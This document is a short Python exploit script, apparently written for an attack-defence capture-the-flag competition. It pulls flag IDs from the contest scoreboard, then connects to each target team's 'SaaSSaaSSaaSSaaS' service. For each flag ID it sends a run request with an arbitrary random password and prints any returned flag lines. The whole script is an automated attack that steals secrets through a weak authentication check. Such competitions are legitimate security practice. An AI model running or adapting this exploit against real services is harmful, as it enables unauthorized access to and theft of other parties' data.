#! /usr/bin/python
from pwn import remote, context
import requests
import json
import sys
import random, string


randstr = lambda N: "".join(random.choices(string.ascii_uppercase, k=N))


def get_flag_ids():
    r = requests.get("https://scoreboard.ctf.saarland/attack.json")
    if r.status_code != 200:
        print(r.text)
        raise RuntimeError("Failed to fetch flag IDs")
    return json.loads(r.text)


fid = get_flag_ids()

ids = fid["flag_ids"]["SaaSSaaSSaaSSaaS"]


ip = sys.argv[1]


if ip not in ids:
    exit()


for k, v in ids[ip].items():
    r = remote(ip, "24929", ssl=True)
    context.log_level = "error"
    r.recvuntil(b"choice: ")
    r.sendline(b"1")
    r.recvuntil(b"run: ")
    r.sendline(v.encode())
    r.recvuntil(b"password: ")
    pw = randstr(8)
    r.sendline(pw.encode())

    try:
        while True:
            x = r.recvline()
            if b"SAAR" in x:
                print(x, flush=True)
    except:
        r.close()